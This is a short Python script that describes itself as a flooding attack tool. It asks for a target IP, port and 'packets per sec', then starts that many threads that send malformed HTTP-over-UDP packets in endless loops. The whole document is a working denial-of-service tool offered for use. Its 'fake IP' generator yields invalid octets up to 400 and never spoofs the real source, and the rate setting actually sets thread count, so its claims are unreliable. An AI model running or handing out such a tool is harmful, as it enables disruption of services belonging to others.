import os
import socket
import threading
import time
from random import randint
version = "1.0"
print("Author: Anony0usWork1221")
print("\n")
print(f"VERSION : {version}")
print('\n')
print('\n\n')
ip1 = randint (0,400)
ip2 = randint (0,400)
ip3 = randint (0,400)
ip4 = randint (0,400)
fake_ip = str (ip1) + '.' + str (ip2) + '.' +str (ip3) + '.' + str (ip4)
ip = input ("ENTER TARGET IP: ")
port = int (input ("ENTER TARGET PORT: "))
per_sec = int (input ("ENTER PACKETS SEND PER SEC: "))
os.system ('clear')
print ("STARTED ATTACKING WITH IP " + str (ip) +" AND PORT " +str (port))

def ATTACK ():
  global ip
  global port
  while True:
    server = socket.socket (socket.AF_INET, socket.SOCK_DGRAM)
    server.sendto (("GET /" + ip + "HTTP/1.1 \r\n").encode ('ascii'), (ip,port))
    server.sendto (("HOST: " + fake_ip + "\r\n\r\n").encode ('ascii'), (ip,port))
    server.close ()
for i in range (per_sec):
  thread = threading.Thread (target = ATTACK)
  thread.start ()
